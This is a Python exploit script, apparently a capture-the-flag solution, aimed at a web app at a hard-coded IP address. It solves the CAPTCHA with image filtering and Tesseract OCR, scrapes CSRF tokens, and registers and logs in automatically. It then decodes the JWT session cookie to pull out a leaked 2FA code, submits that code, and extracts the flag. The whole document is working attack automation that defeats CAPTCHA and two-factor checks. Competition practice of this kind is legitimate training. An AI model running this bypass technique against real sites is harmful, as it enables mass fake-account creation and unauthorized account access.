import requests
import re
import io
import subprocess
import numpy as np
import base64
import json
import random
import string
from PIL import Image

BASE = 'http://95.216.124.220:31608'

def ocr_captcha(s):
    """Résout le CAPTCHA en isolant les pixels 200 et OCR avec Tesseract"""
    r = s.get(f'{BASE}/captcha.php')
    img = Image.open(io.BytesIO(r.content)).convert('L')
    arr = np.array(img)
    clean = np.where(arr == 200, 255, 0).astype(np.uint8)
    big = Image.fromarray(clean, 'L').resize((900, 300), Image.NEAREST)
    big.save('/tmp/cap.png')
    res = subprocess.run(
        ['tesseract', '/tmp/cap.png', 'stdout', '--psm', '7',
         '-c', 'tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'],
        capture_output=True, text=True)
    return res.stdout.strip()

def decode_jwt(token):
    """Décode le payload d'un JWT (base64)"""
    p = token.split('.')[1]
    p += '=' * (-len(p) % 4)
    return json.loads(base64.b64decode(p))

user  = 'knight' + ''.join(random.choices(string.digits, k=5))
email = user + '@pwn.io'

for _ in range(30):
    s = requests.Session()

    reg = s.get(f'{BASE}/register.php')
    csrf = re.search(r'name="csrf_token"\s+value="([^"]+)"', reg.text).group(1)
    cap = ocr_captcha(s)
    r = s.post(f'{BASE}/register.php', data={
        'username': user,
        'email': email,
        'password': 'Str0ng!Pass',
        'registration_code': 'I_Am_Knight',
        'captcha': cap,
        'website': '',
        'csrf_token': csrf
    }, allow_redirects=True)
    
    if 'captcha' in r.text.lower():
        continue

    lp = s.get(f'{BASE}/login.php')
    lcsrf = re.search(r'name="csrf_token"\s+value="([^"]+)"', lp.text).group(1)
    s.post(f'{BASE}/login.php', data={
        'email': email,
        'password': 'Str0ng!Pass',
        'website': '',
        'csrf_token': lcsrf
    }, allow_redirects=False)

    jwt = s.cookies.get('knight_token')
    otp = decode_jwt(jwt)['2fa_token']

    r2 = s.post(f'{BASE}/verify_2fa.php', data={'otp': otp}, allow_redirects=True)
    
    flags = re.findall(r'CCOI26\{[^}]+\}', r2.text)
    if flags:
        print(f'FLAG: {flags[0]}')
        break
